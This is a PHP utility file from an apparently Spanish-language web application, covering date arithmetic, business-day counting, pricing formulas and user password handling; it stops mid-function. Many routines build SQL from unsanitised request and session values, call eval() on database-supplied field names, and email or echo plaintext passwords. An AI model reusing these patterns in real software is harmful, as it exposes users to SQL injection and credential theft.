
<?php
// 	QUITAR EL COMENTARIO DE LA SIGUIENTE LINEA PARA VER LOS MENSAJES DE ERROR
//error_reporting(E_ALL);
error_reporting(E_ALL);
ini_set('display_errors', '1');
include_once('../Control/operativo/config/config.php');
if(GLOBALES) require_once('../Control/operativo/inc/gpos.php');

if(!function_exists('file_put_contents')) include('inc/func_php5.php');

if(defined('ENCRIPCION'))
{
if(ENCRIPCION >= 1)	
	
switch(ENCRIPCION){	
        case 2:include('../Control/operativo/inc/encripcion_2.php');break;
		case 3:include('../Control/operativo/inc/encripcion_3.php');break;
		default: include('../Control/operativo/inc/encripcion_1.php');
		}
		
		}else include('inc/encripcion_1.php');
 
$LINK = $LINKM = 0;
 
#---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
#
#
#  **************************FUNCIONES DE FECHA  Y HORA****************************************************
#
#
#---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

function ndiasemana($d)
{
	if(gettype($d)=="string" && strpos($d,'-')) $d=date('w',strtotime($d));
	switch($d) {
		case 0: return 'Domingo';
		case 1: return 'Lunes';
		case 2: return 'Martes';
		case 3: return 'Miércoles';
		case 4: return 'Jueves';
		case 5: return 'Viernes';
		case 6: return 'Sábado';
	}
	return gettype($d);
}

function aumentadias($Fecha, $Dias) // aumenta $Dias a la Fecha dada
{
	$Nuevafecha = date('Ymd', mktime(0, 0, 0, date('m', strtotime($Fecha)), date('d', strtotime($Fecha)) + $Dias, date('Y', strtotime($Fecha))));
	return $Nuevafecha;
}

function aumentameses($Fecha, $Meses) // aumenta $meses ala $fecha dada
{
	$Nuevafecha = date('Ymd', mktime(0, 0, 0, date('m', strtotime($Fecha)) + $Meses, date('d', strtotime($Fecha)), date('Y', strtotime($Fecha))));
	return $Nuevafecha;
}

function aumentaminutos($Hora,$cantidad)
{
	$H=date('H',strtotime($Hora));
	$M=date('i',strtotime($Hora));
	$S=date('s',strtotime($Hora));
	if($cantidad>0)
	{
		for($i=1;$i<=$cantidad;$i++)
		{
			if($M<59) $M++;
			elseif($H<23)
			{
				$H++;$M=0;
			}
			else
			{
				$H=0;$M=0;
			}
		}
	}
	else
	{
		$cantidad=-$cantidad;
		for($i=1;$i<=$cantidad;$i++)
		{
			if($M>1) $M--;
			elseif($H>0)
			{
				$H--;$M=59;
			}
			else
			{
				$H=23;$M=59;
			}
		}
	}
	return date('H:i:s',strtotime("$H:$M:$S"));
}

function aumentaperiodo($Periodo,$Cantidad)
{
  $Ano=l($Periodo,4);
  $Mes=r($Periodo,2);
  $Fecha=date('Y-m-d',strtotime($Ano.'/'.$Mes.'/10'));
  $Fecha=aumentameses($Fecha,$Cantidad);
  return date('Ym',strtotime($Fecha));
}

function strtofecha($Fecha) // convierte cadenas string que contienen informacion de fechas a campos extrictamente de formato date
{
	$Nuevafecha = date('Ymd', mktime(0, 0, 0, date('m', strtotime($Fecha)), date('d', strtotime($Fecha)), date('Y', strtotime($Fecha))));
	return $Nuevafecha;
}

function dias($FECHA1, $FECHA2)   //  obtiene la diferencia en dia entre las dos fechas
{
	$Fec1 = strtotime(strtofecha($FECHA1));
	$Fec2 = strtotime(strtofecha($FECHA2));
	return floor(abs($Fec1 - $Fec2) / 86400);
}

function horas($FECHA1, $FECHA2)  // obtiene la diferencia en horas entre las dos fechas
{
	$Fec1 = strtotime($FECHA1);
	$Fec2 = strtotime($FECHA2);
	return floor(abs($Fec2 - $Fec1) / 3600);
}

function edad($BirthDate)  //  obtiene la edad con respecto a la fecha del sistema
{
	list($year, $month, $day) = split('[-.]', $BirthDate);
	$tmonth = date('n');
	$tday = date('j');
	$tyear = date('Y');
	$years = $tyear - $year;
	if ($tmonth <= $month)
	{
		if ($month == $tmonth)
		{
			if ($day > $tday)
				$years--;
		}
		else
			$years--;
	}
	RETURN $years;
}

function diferencia_meses($FI,$FF)
{
	$PerIni=date('Ym',strtotime($FI));
	$PerFin=date('Ym',strtotime($FF));
	$Contador=0;
	while($PerIni<=$PerFin)
	{
		$PerIni=aumentaperiodo($PerIni,1);
		$Contador++;
	}
	return $Contador;
}

function mes($numero) // trae en españo el nombre del mes
{
	$Meses=array('Enero','Febrero','Marzo','Abril','Mayo','Junio','Julio','Agosto','Septiembre','Octubre','Noviembre','Diciembre');
	return $Meses[$numero-1];
}

function ultimo_dia_de_mes($ano, $mes) // determina el ultimo dia del mes dado
{
	$a = $ano . '-' . $mes . '-' . '01';
	$b = date('Y-m-d', strtotime($a));
	$ultimo = 0;
	while(date('m', strtotime($b)) == $mes)
	{
		$b = aumentadias($b, 1);
		$ultimo++;
	}
	return $ultimo;
}

function primer_dia_de_mes($fecha) // determina el primer dia del mes dado
{
	$A = date('Y-m-', strtotime($fecha)) . '01';
	return date('Y-m-d', strtotime($A));
}

function siguiente_dia_habil($Fecha, $Dias = 1, $Tabla = 'festivos', $Sabado = 1) // busca el siguiente dia habil de una fecha usando la tabla festivos
{
	if (!haytabla($Tabla))
	{
		die("LA TABLA $Tabla no existe para identificar los festivos");
	}
	$CONTADOR = 0;
	$Siguiente_dia = date('Y-m-d', strtotime($Fecha));
	while($CONTADOR < $Dias)
	{
		$Siguiente_dia = aumentadias($Siguiente_dia, 1);
		$Diasemana = date('w', strtotime($Siguiente_dia));
		echo "$CONTADOR $Dias $Diasemana $Sabado<br />";
		if($Diasemana == 0 /* domingo */) continue;
		if($Sabado)
		{
			if($Diasemana == 6 /*sabado*/) continue;
		}
		if(qo1("select id from $Tabla where fecha='$Siguiente_dia'")) continue;
		$CONTADOR++;
	} // while
	return $Siguiente_dia;
}

function fecha_completa($Fecha) // Presenta la fecha dada en el formato: dd de mmmmmmmm de aaaa
{
	$Fecha = strtotime($Fecha);
	return date('d', $Fecha) . ' de ' . mes(date('m', $Fecha)) . ' de ' . date('Y', $Fecha);
}

function fecha_hora_completa($Fecha) // Presenta la fecha dada en el formato: dd de mmmmmmmm de aaaa
{
	$Fecha = strtotime($Fecha);
	return date('d', $Fecha).' de '.mes(date('m', $Fecha)).' de '.date('Y', $Fecha).' a la(s) '.date('h:i:s A');
}

function fecha_completa_firma($Fecha) // presenta la fecha dada en el formato: a los dd dias del mes de mmmmmmmmmm del año aaaa
{
	$Fecha = strtotime($Fecha);
	return (date('d', $Fecha) > 9?'a los ' . date('d', $Fecha) . ' dias ':'el dia ' . date('d', $Fecha)) . ' del mes de ' . mes(date('m', $Fecha)) . ' del año ' . date('Y', $Fecha);
}

function segundos($hora_inicio,$hora_fin)
{
	if(strpos($hora_inicio,'-'))
	{
		$hora_i=substr($hora_inicio,11,2); $minutos_i=substr($hora_inicio,14,2);$segundos_i=substr($hora_inicio,17,2);$año_i=substr($hora_inicio,0,4);$mes_i=substr($hora_inicio,5,2);$dia_i=substr($hora_inicio,8,2);
		$hora_f=substr($hora_fin,11,2);$minutos_f=substr($hora_fin,14,2);$segundos_f=substr($hora_fin,17,2);$año_f=substr($hora_fin,0,4);$mes_f=substr($hora_fin,5,2);$dia_f=substr($hora_fin,8,2);
	}
	else
	{
		$hora_i=substr($hora_inicio,0,2);$minutos_i=substr($hora_inicio,3,2);$segundos_i=substr($hora_inicio,6,2);$año_i='2000';$mes_i='01';$dia_i='01';
		$hora_f=substr($hora_fin,0,2);$minutos_f=substr($hora_fin,3,2);$segundos_f=substr($hora_fin,6,2);$año_f='2000';$mes_f='01';$dia_f='01';
	}
	$diferencia_seg=mktime($hora_f,$minutos_f,$segundos_f,$mes_f,$dia_f,$año_f) - mktime($hora_i,$minutos_i,$segundos_i,$mes_i,$dia_i,$año_i);
	return $diferencia_seg;
}

function segundos_habiles($momento_inicial,$momento_final,$Sabado=false)  // Toma dias hábiles entre las 8:00 am y las 6:pm excluye sabados y domingos.
{
	/*
	$Festivos=array('2010-01-01','2010-01-11','2010-03-22','2010-04-01','2010-04-02','2010-05-01','2010-05-17','2010-06-07','2010-06-14','2010-07-05','2010-07-20','2010-08-07','2010-08-16','2010-10-18','2010-11-01','2010-11-15','2010-12-08','2010-12-25',
							'2011-01-01','2011-01-10','2011-03-21','2011-04-21','2011-04-22','2011-05-01','2011-05-15','2011-06-06','2011-06-27','2011-07-04','2011-07-20','2011-08-07','2011-08-15','2011-10-17','2011-11-07','2011-11-14','2011-12-08','2011-12-25',
							'2012-01-01','2012-01-09','2012-03-19','2012-04-05','2012-04-06','2012-05-01','2012-05-21','2012-06-11','2012-06-18','2012-07-02','2012-07-20','2012-08-07','2012-08-20','2012-10-15','2012-11-05','2012-11-12','2012-12-08','2012-12-25',
							'2013-01-01','2013-01-07','2013-03-25','2013-03-28','2013-03-29','2013-05-01','2013-05-13','2013-06-03','2013-06-10','2013-07-01','2013-07-20','2013-08-07','2013-08-19','2013-10-14','2013-11-04','2013-11-11','2013-12-25',
							'2014-01-01','2014-01-06','2014-03-24','2014-03-31','2014-04-17','2014-04-18','2014-05-01','2014-06-02','2014-06-23','2014-06-30','2014-08-07','2014-08-18','2014-10-13','2014-11-03','2014-11-17','2014-12-08','2014-12-25'
							);
							*/
$Festivos=array('2010-01-01','2010-01-11','2010-03-22','2010-04-01','2010-04-02','2010-05-01','2010-05-17','2010-06-07','2010-06-14','2010-07-05','2010-07-20','2010-08-07','2010-08-16','2010-10-18','2010-11-01','2010-11-15','2010-12-08','2010-12-25',
							'2011-01-01','2011-01-10','2011-03-21','2011-04-21','2011-04-22','2011-05-01','2011-05-15','2011-06-06','2011-06-27','2011-07-04','2011-07-20','2011-08-07','2011-08-15','2011-10-17','2011-11-07','2011-11-14','2011-12-08','2011-12-25',
							'2012-01-01','2012-01-09','2012-03-19','2012-04-05','2012-04-06','2012-05-01','2012-05-21','2012-06-11','2012-06-18','2012-07-02','2012-07-20','2012-08-07','2012-08-20','2012-10-15','2012-11-05','2012-11-12','2012-12-08','2012-12-25',
							'2013-01-01','2013-01-07','2013-03-25','2013-03-28','2013-03-29','2013-05-01','2013-05-13','2013-06-03','2013-06-10','2013-07-01','2013-07-20','2013-08-07','2013-08-19','2013-10-14','2013-11-04','2013-11-11','2013-12-25'
							);
	$hhi='08:00:00';$hhf='18:00:00';
	$Mi=strtotime($momento_inicial);$Mf=strtotime($momento_final);
	$A=date('Y',$Mi);$M=date('m',$Mi);$D=date('d',$Mi);$h=date('H',$Mi);$m=date('i',$Mi);$s=date('s',$Mi);
	$AF=date('Y',$Mf);$MF=date('m',$Mf);$DF=date('d',$Mf);$hf=date('H',$Mf);$mf=date('i',$Mf);$sf=date('s',$Mf);
	$momentof=mktime($hf,$mf,$sf,$MF,$DF,$AF);
	$momento=mktime($h,$m,$s,$M,$D,$A);
	$contador=0;
	while($momento<$momentof)
	{
		$hhi=mktime(8,0,0,date('m',$momento),date('d',$momento),date('Y',$momento));
		$hhf=mktime(18,0,0,date('m',$momento),date('d',$momento),date('Y',$momento));
		if(date('w',$momento)>0 && date('w',$momento)<($Sabado?7:6) && !in_array(date('Y-m-d',$momento),$Festivos))
		{
			if($momento>=$hhi && $momento<=$hhf)
			{
				if($momentof>=$hhi && $momentof<=$hhf)
				{
					$contador+=($momentof-$momento); $momento+=$contador;
				}
				else
				{
					$contador+=($hhf-$momento); $momento=$hhf+1;
				}
			}
			else
			{
				if($momento<$hhi) $momento=$hhi; else $momento=mktime(8,0,0,date('m',$momento),date('d',$momento)+1,date('Y',$momento));
			}
		}
		else $momento=mktime(8,0,0,date('m',$momento),date('d',$momento)+1,date('Y',$momento));
	}
	return $contador;
}

function segundos2tiempo($Valor)
{
	$Segundos=$Minutos=$Horas=$Dias=$Meses=$Anos=0;
	$Segundos=round($Valor,0);
	if($Valor<60)
	{
		return "$Segundos''";
	}
	else
	{
		$Minutos=intval($Valor/60);
		$Segundos=$Segundos-($Minutos*60);
		if($Minutos>=60)
		{
			$Horas=intval($Minutos/60);
			$Minutos=$Minutos-($Horas*60);
			if($Horas>=24)
			{
				$Dias=intval($Horas/24);
				$Horas=$Horas-($Dias*24);
				if($Dias>=30)
				{
					$Meses=intval($Dias/30);
					$Dias=$Dias-($Meses*30);
					if($Meses>=12)
					{
						$Anos=intval($Meses/12);
						$Meses=$Meses-($Anos*12);
						return "$Anos A $Meses M $Dias D $Horas:$Minutos' $Segundos''";
					}
					else return "$Meses M $Dias D $Horas:$Minutos' $Segundos''";
				}
				else return "$Dias D $Horas:$Minutos' $Segundos''";
			}
			else return "$Horas:$Minutos' $Segundos'' ";
		}
		else return "$Minutos' $Segundos''";
	}
}

function segundos2horas($Valor)
{
	$Segundos=$Minutos=$Horas=0;
	$Segundos=round($Valor,0);
	if($Valor<60)
	{
		return "$Segundos''";
	}
	else
	{
		$Minutos=intval($Valor/60);
		$Segundos=$Segundos-($Minutos*60);
		if($Minutos>=60)
		{
			$Horas=intval($Minutos/60);
			$Minutos=$Minutos-($Horas*60);
			return "$Horas:$Minutos' $Segundos'' ";
		}
		else return "$Minutos' $Segundos''";
	}
}

function segundos2minutos($Valor)
{
	$Segundos=$Minutos=0;
	$Segundos=round($Valor,0);
	if($Valor<60)
	{
		return "$Segundos''";
	}
	else
	{
		$Minutos=intval($Valor/60);
		$Segundos=$Segundos-($Minutos*60);
		return "$Minutos' $Segundos''";
	}
}

function diferencia_tiempo($Inicio,$Fin)
{
	$Segundos=$Minutos=$Horas=$Dias=$Meses=$Anos=0;
	$Segundos=segundos($Inicio,$Fin);
	if($Segundos>60)
	{
		$Minutos=intval($Segundos/60);
		$Segundos=$Segundos-($Minutos*60);
		if($Minutos>60)
		{
			$Horas=intval($Minutos/60);
			$Minutos=$Minutos-($Horas*60);
			if($Horas>24)
			{
				$Dias=intval($Horas/24);
				$Horas=$Horas-($Dias*24);
				if($Dias>30)
				{
					$Meses=intval($Dias/30);
					$Dias=$Dias-($Meses*30);
					if($Meses>12)
					{
						$Anos=intval($Meses/12);
						$Meses=$Meses-($Anos*12);
					}
				}
			}
		}
	}
	return ($Anos?"$Anos a.":"").($Meses?"$Meses m.":"").($Dias?"$Dias d. ":"").($Horas?"$Horas:":"").($Minutos?"$Minutos'":"").($Segundos?"$Segundos\"":"");
}

function diferencia_periodo($Inicial,$Final)
{
	$Ano_i=l($Inicial,4); $Mes_i=r($Inicial,2);$Contador=0;
	while($Inicial<$Final)
	{
		if($Mes_i==12) {$Mes_i=1;$Ano_i++;} else $Mes_i++;
		$Inicial=$Ano_i.str_pad($Mes_i,2,'0',STR_PAD_LEFT);
		$Contador++;
	}
	return $Contador;
}

function aumenta_periodo($Periodo,$Cantidad)
{
	if($Cantidad>0)
	{
		$Ano_i=l($Periodo,4); $Mes_i=r($Periodo,2);$Contador=0;
		while($Contador<$Cantidad)
		{
			if($Mes_i==12) {$Mes_i=1;$Ano_i++;} else $Mes_i++;
			$Periodo=$Ano_i.str_pad($Mes_i,2,'0',STR_PAD_LEFT);
			$Contador++;
		}
		return $Periodo;
	}
	else
	{
		$Ano_i=l($Periodo,4); $Mes_i=r($Periodo,2);$Contador=0;
		while($Contador>$Cantidad)
		{
			if($Mes_i==01) {$Mes_i=12;$Ano_i--;} else $Mes_i--;
			$Periodo=$Ano_i.str_pad($Mes_i,2,'0',STR_PAD_LEFT);
			$Contador--;
		}
		return $Periodo;
	}
}

function primer_dia_de_semana($Fecha)
{
	$Dia_en_semana=date('w',strtotime($Fecha));
	if($Dia_en_semana==1) return $Fecha;
	if($Dia_en_semana==0) return date('Y-m-d',strtotime(aumentadias($Fecha,-7)));
	return date('Y-m-d',strtotime(aumentadias($Fecha,-$Dia_en_semana+1)));
}

#---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
#
#
# ******************************************FUNCIONES FINANCIERAS*********************************************************
#
#
#---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

function interes_vfd($MONTO, $INTERES_MENSUAL, $PERIODOS)  // formula de valor futuro
{
	$Interes_diario = ($INTERES_MENSUAL / 100) / 30;
	$Interes_vf = pow(1 + $Interes_diario, $PERIODOS)-1;
	return $MONTO * $Interes_vf;
}

function interes_lineal($MONTO, $INTERES_MENSUAL, $PERIODOS) // formula de interes lineal con formula de valor futuro
{
	$Interes_diario = ($INTERES_MENSUAL / 100) / 30;
	$Interes_vf = ($Interes_diario * $PERIODOS);
	return $MONTO * $Interes_vf;
}

function rentabilidad_pvp($Base=0,$Rentabilidad=0)
{
	// obtiene el precio de venta al publico dandole la Base y la Rentabilidad
	return $Base/(1-($Rentabilidad/100));
}

function rentabilidad_base($Pvp=0,$Rentabilidad=0)
{
	// obtiene la base dandole el precio de venta al publico y la rentabilidad
	return $Pvp-$Pvp*$Rentabilidad/100;
}

function rentabilidad($Base=0,$Pvp=0)
{
	// obtiene la rentabilidad a partir de la base y el precio de venta al publico
	return ($Pvp!=0?(100*($Pvp-$Base))/$Pvp:0);
}

#---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
#
#
#********************************************FUNCIONES DE USUARIO***********************************************
#
#
#---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

function usuario($CAMPO) // traer cualquier informacion sobre el usuario actual
{
	session_cache_expire('900000');
	session_start();
	$TU = $_SESSION['Tabla_usuario'];
	$IA = $_SESSION['Id_alterno'];
	return qo1("select $CAMPO from $TU where id=$IA");
}

function borra_sesion($CAMPO) // Borra la sesión del usuario
{
	if(!$SID = session_id()) {session_cache_expire('900000');session_start();}
	if(session_is_registered($CAMPO))
	{
		session_unregister($CAMPO);
	}
	return 1;
}

function asignaclave($Campo, $Email, $TU = "", $IA = 0) // Asigna una clave encriptada de 5 digitos al campo Campo de la tabla Tabla en el registro de id=Id_alterno y se envia el mensaje a Email
{
	$Clave = rand(50001, 99991);
	$Clave_encriptada = e($Clave);
	if(strlen($TU) == 0)
	{
		session_cache_expire('900000');
		session_start();
		$TU = $_SESSION['Tabla_usuario'];
		$IA = $_SESSION['Id_alterno'];
	}
	q("update $TU set $Campo='$Clave_encriptada' where id=$IA");
	if(strlen($Email) != 0 && strpos($Email, '@'))
	{
		$Texto = "Apreciado Usuario \n\nUsted ha solicitado por medio del sistema que se le asigne un nuevo password.\n\n";
		$Texto .= "A continuación aparece la información correspondiente:\n\n";
		$Texto .= "Password: $Clave";
		include('config/config.php');
		if(mail($Email, 'Su nuevo password', $Texto, "'From:" . FROM_SOPORTE . "'"))
			return "Enviado al correo: $Email el nuevo password";
		else
			return "No pudo enviarse el mensaje al correo electronico. La nueva clave es: $Clave";
	}
	else
		return "La nueva clave es: $Clave";
}

function tu($Tabla, $Campo) // recupera variables de entorno del usuario
{
	if(!$SID = session_id()) {session_cache_expire('90000');session_start();}
	$USUARIO = $_SESSION['User'];
	return qo1("Select $Campo from usuario_tab where tabla='$Tabla' and usuario=$USUARIO");
}

function cambio_pass() // Aparece la ventana de dialogo de cambio de password del usuario
{
	global $reload;
	html();
	
	$Control = qo("select * from usuario where id=" . $_SESSION['User']);
	if($Control->alt_nombre && $Control->alt_id && $Control->alt_pass && $Control->alt_tabla)
	{
		$Usuario = qo("select * from " . $_SESSION['Tabla_usuario'] . " where id=" . $_SESSION['Id_alterno']);
		eval('$Nombre=$Usuario->' . $Control->alt_nombre . ';');
	}
	else $Nombre = $Control->nombre;
	echo "
	<script language='javascript'>
	function validakey()
	{
		var P1=document.forma.nueva1.value;
		var P2=document.forma.nueva2.value;

		var Validacion1=clave_segura(P1,'ok1');
		var Validacion2=clave_segura(P2,'ok2',P1);
		validar_espacios_vacios(P1);
		if(Validacion1 && Validacion2) document.forma.cambio.disabled=false; else document.forma.cambio.disabled=true;
	}
	
	function validar_espacios_vacios(p1){
		var espacios = false;
			var cont = 0;
			 
			while (!espacios && (cont < p1.length)) {
			  if (p1.charAt(cont) == ' ')
				espacios = true;
			  cont++;
			}
			 
			if (espacios) {
			  alert ('La contraseña no puede contener espacios en blanco');
			  return false;
			}
	}

	function clave_segura(dato,sp,dato1)
	{
		if(!dato1) dato1='';
		var Sp=document.getElementById(sp);
		if(dato.length<8)
		{ Sp.innerHTML=\"<a class='info'><img src='gifs/standar/info.png' border='0'><span>Faltan caracteres minimo 8</span></a>\";return false;}
		if(dato1!='')
		{
			if(dato!=dato1)
			{
				Sp.innerHTML=\"<a class='info'><img src='gifs/standar/info.png' border='0'><span>La confirmación de la contraseña no coincide</span></a>\";return false;
			}
		}
		Sp.innerHTML=\"<a class='info'><img src='gifs/standar/feliz.png' border='0'><span>Contraseña aceptable</span></a>\";
		
		/* /^(?=.*\d)(?=.*[a-záéíóúüñ]).*[A-ZÁÉÍÓÚÜÑ]/ */
		
		var RegExPattern = /^(?=\S*[a-z])(?=\S*[A-Z])(?=\S*\d)(?=\S*[^\w\s])\S{8,}$/;
		
		
		
		if(dato.match(RegExPattern)){
			Sp.innerHTML=\"<a class='info'><img src='gifs/standar/okazul.png' border='0'><span>Contraseña muy segura</span></a>\";
		}else{
			Sp.innerHTML=\"<a class='info'><img src='gifs/standar/info.png' border='0'><span>Mínimo de ocho y máximo de 10 caracteres, al menos una letra mayúscula, una letra minúscula, un número y un carácter especial:</span></a>\";return false;
		}
		
		/*
		if(dato.match(RegExPattern))
		{
			Sp.innerHTML=\"<a class='info'><img src='gifs/standar/okazul.png' border='0'><span>Contraseña muy segura</span></a>\";
		}
		*/
		
		return true;
	}

	</script>
	<body>" . titulo_modulo("Cambio de contraseña $Nombre");
	echo "<form action='marcoindex.php' method='post' target='_self' name='forma' id='forma'>

		<table align='center'>
			<tr><td>Clave Actual</td><td><input type='password' name='clave_actual' value='' size='30' maxlength='50' onKeyPress='bloqueo_mayusculas(event)'></td></tr>
			<tr><td>Clave Nueva</td><td><input type='password' name='nueva1' value='' size='30' maxlength='50' onkeyup='validakey()'  onKeyPress='bloqueo_mayusculas(event)'></td><td><span id='ok1'></span></td></tr>
			<tr><td>Clave Nueva (confirmación)</td><td><input type='password' name='nueva2' value='' size='30' maxlength='50' onkeyup='validakey()'  onKeyPress='bloqueo_mayusculas(event)'></td><td><span id='ok2'></span></td></tr>
			<tr><td colspan=2><div id='bloqueomayusculas' style='visibility:hidden'><b style='color:red'>El bloqueo de mayúsculas está activado</b></div></td></tr>
			<tr><td colspan='2' align='center'><input type='button' id='cambio' name='cambio' style='width:200px;height:30;font-weight:bold;' value='Cambiar Contraseña' onclick=\"valida_campos('forma','nueva1,nueva2');\" disabled></td></tr>
			<tr><td colspan='2' style='font-size:16px'><input type='hidden' name='Acc' value='cambiar_password'>
		Este sistema solicita al menos 8 caracteres para la contraseña. <br />Se sugiere utilizar una contraseña <b>altamente segura</b>, <br />en la cual debe aparecer como mínimo un
			caracter en mayúsculas, <br />mínimo un caracter en minúsculas y mínimo un digito numérico.</td></tr>
	</table>
	</form>
	</body>";
}

function cambiar_password()  // Cambia el password viene de CAMBIO_PASS()
{
	global $clave_actual,$nueva1,$nueva2;
	html();
	$Control = qo("select * from usuario where id=" . $_SESSION['User']);
	if($Control->alt_nombre && $Control->alt_id && $Control->alt_pass && $Control->alt_tabla)
	{
		$Usuario = qo("select * from " . $_SESSION['Tabla_usuario'] . " where id=" . $_SESSION['Id_alterno']);
		eval('$Clave_actual=$Usuario->'.$Control->alt_pass.';');
		eval('$usuario=$Usuario->'.$Control->alt_id.';');
	}
	else
	{
		$Clave_actual = $Control->clave;$usuario=$Control->idnombre;
	}
	if(strcmp(e($nueva1),$Clave_actual)!=0)
	{
		if(strcmp(e($clave_actual), $Clave_actual) == 0 || ($clave_actual == '' && $Clave_actual == '') || $_SESSION['Disenador'] == 1)
		{
			$nclave=e($nueva1);
			if($idu=qo1("select id from usuario where idnombre='$usuario' "))
			{
				$Verificado="USUARIO, ";
				q("update usuario set clave='$nclave' where idnombre='$usuario' ");
				graba_bitacora('usuario','M',$idu,'Cambio de Clave');
			}
			$Alternas=q("select nombre,alt_tabla, alt_id,alt_pass from usuario where alt_tabla!='' and alt_id!='' and alt_pass!='' ");
			while($Alt=mysql_fetch_object($Alternas))
			{
				//q("ALTER TABLE `aoacol_aoacars`.`$Alt->alt_tabla` ADD COLUMN `auditoria_clave` VARCHAR(45) NOT NULL DEFAULT 0");
				if($idu=qo1("select id from $Alt->alt_tabla where $Alt->alt_id='$usuario' "))
				{
					q("update $Alt->alt_tabla set $Alt->alt_pass='$nclave', validar_clave = '0' where $Alt->alt_id='$usuario' ");
					
					graba_bitacora($Alt->alt_tabla,'M',$idu,'Cambio de Clave');
					$Verificado.=$Alt->nombre.', ';
				}
			}
			echo "<body onload='centrar(450,300);'><h2><b><font color='blue'>CAMBIO SATISFACTORIO</FONT></b></h2>
			La contraseña de " . $_SESSION['Nombre'] . " ha sido cambiada satisfactoriamente.<br /><br /> Perfiles verificados: $Verificado<br><br>
			<input type='button' value='Cerrar esta ventana' onclick='javascript:window.close();void(null);'>
			</body>";
			$_SESSION['Pide_cambio_pass']=0;
		}
		else
			echo "<body onload='centrar(400,200);'><h2><b><font color='red'>ERROR</FONT></b></h2>
			La contraseña actual no corresponde. Debe digitar la contraseña actual y la nueva contraseña dos veces<br><br>
			<input type='button' value='Cerrar esta ventana' onclick='javascript:window.close();void(null);'>
			<input type='button' value='Intentarlo nuevamente' onclick=\"window.open('marcoindex.php?Acc=cambio_pass','_self');\">
			</body>";
	}
	else
		echo "<body onload='centrar(400,200);'><h2><b><font color='red'>ERROR</FONT></b></h2>
		La nueva contraseña no debe ser la misma que tiene actualmente.<br><br>
		<input type='button' value='Cerrar esta ventana' onclick='javascript:window.close();void(null);'>
		<input type='button' value='Intentarlo nuevamente' onclick=\"window.open('marcoindex.php?Acc=cambio_pass','_self');\">
		</body>";
}

function asigna_pass() // Ventana de asignación individual de password desde un usuario administrativo
{
	html();
	global $Tabla, $Campo, $Id_usuario, $id;
	if(!$Id_usuario && $id) $Id_usuario = $id;
	echo "<body onload='centrar(400,300);'>" . titulo_modulo("Asignación de Contraseña");
	echo "<form action='marcoindex.php' method='post' target='_self' name='forma' id='forma'>
		<div id='bloqueomayusculas' style='visibility:hidden'><b>El bloqueo de mayúsculas está activado</b></div><br>
		Nueva contraseña: <input type='password' name='contrasena' size='50' maxlength='50'  onKeyPress='bloqueo_mayusculas(event)'><br>
		<input type='button' value='Grabar' onclick=\"valida_campos('forma','contrasena');\">
		<input type='hidden' name='Acc' value='asigna_password'>
		<input type='hidden' name='Tabla_cambio' value='$Tabla'>
		<input type='hidden' name='Campo' value='$Campo'>
		<input type='hidden' name='Id_usuario' value='$Id_usuario'>
	</form></body>
	";
}

function asigna_password()  // graba un password viene de ASIGNA_PASS()
{
	require('inc/gpos.php');
	q("Update $Tabla_cambio set $Campo='" . e($contrasena) . "', validar_clave = 1 where id=$Id_usuario");
    
	echo "<body onload='javascript:window.close();void(null);'>";
}

function asigna_pass_masivo()  // Resetea passwords masivamente a varios registros de usuario
{
	html();
	require('inc/gpos.php');
	q("update $Tabla set $Campo='" . e("") . "' ");
	echo "<body onload=\"centrar(200,100);window.close();void(null);alert('Asignaciones realizadas');\">";
}

function busca_perfiles() // Busqueda de los diversos perfiles de un usuario
{
	global $Usuario_consulta;
	html();
	echo "<body onload='centrar(600,500);'>".titulo_modulo("Busqueda de perfiles");
	if($Usuario_consulta)
	{
		$PERFIL = array();
		$ENCONTRADO = 0;
		if($R = qo("select * from usuario where idnombre like '%$Usuario_consulta%' "))
		{
			$PERFIL[$ENCONTRADO]['Idnombre'] = $R->idnombre;
			$PERFIL[$ENCONTRADO]['Nombre'] = $R->nombre;
			$PERFIL[$ENCONTRADO]['Nombre_Perfil'] = $R->nombre;
			$PERFIL[$ENCONTRADO]['Nombre_Tabla'] = 'usuario';
			$ENCONTRADO++;
		}
		if($S1 = q("select * from usuario where LENGTH(alt_tabla)>0 && LENGTH(alt_id)>0 && LENGTH(alt_pass)>0 && LENGTH(alt_nombre)>0"))
		{
			while ($R1 = mysql_fetch_object($S1))
			{
				if($S2 = q("select id,$R1->alt_nombre as nombre,$R1->alt_id as idnombre from $R1->alt_tabla where $R1->alt_id like '%$Usuario_consulta%' "))
				{
					while($R2 = mysql_fetch_object($S2))
					{
						$PERFIL[$ENCONTRADO]['Idnombre'] = "$R2->idnombre";
						$PERFIL[$ENCONTRADO]['Nombre'] = "$R2->nombre";
						$PERFIL[$ENCONTRADO]['Nombre_Perfil'] = "$R1->nombre";
						$PERFIL[$ENCONTRADO]['Nombre_Tabla'] = "$R1->alt_tabla";
						$ENCONTRADO++;
					}
				}
			}
		}
		if(count($PERFIL) > 1)
		{
			ECHO "Perfiles encontrados para $Usuario_consulta: <br>
				<table border cellspacing=0><tr><th>Perfil de Seguridad</th><th>Nombre Usuario</th><th>Tabla</th></tr>";
			for($I = 0;$I < count($PERFIL);$I++)
			{
				echo "<tr>
						<td>".$PERFIL[$I]['Nombre_Perfil']."</td>
						<td>".$PERFIL[$I]['Nombre']."</td>
						<td>".$PERFIL[$I]['Nombre_Tabla']."</td>
						<td>".$PERFIL[$I]['Idnombre']."</td>
						</tr>";
			}
			echo "</table><br>";
		}
		else
		echo "<font color='red'>No se encuentran perfiles para</font> <b><font color='blue'>$Usuario_consulta</font></b><br>";
	}
	echo "<hr><form action='marcoindex.php' method='post' target='_self' name='forma' id='forma'>
	Escriba el usuario: <input type='text' name='Usuario_consulta'><br>
	<input type='hidden' name='Acc' value='busca_perfiles'>
	<input type='submit' value='Consultar'></form>
	</body>";
}

function graba_bitacora($Nombre_tabla='',$Accion='',$Registro=0,$Cambios='',$LINK=false)
{
	if($LINK)
		mysql_query("insert into app_bitacora (ano,mes,dia,hora,minuto,segundo,nick,nombre,tabla,accion,registro,ip,detalle)
			values ('".date('Y')."','".date('m')."','".date('d')."','".date('G')."','".date('i')."',
			'".date('s')."','".$_SESSION['Nick']."','".$_SESSION['Nombre']."','$Nombre_tabla','$Accion','$Registro','".$_SERVER['REMOTE_ADDR']."','$Cambios')",$LINK);
	else
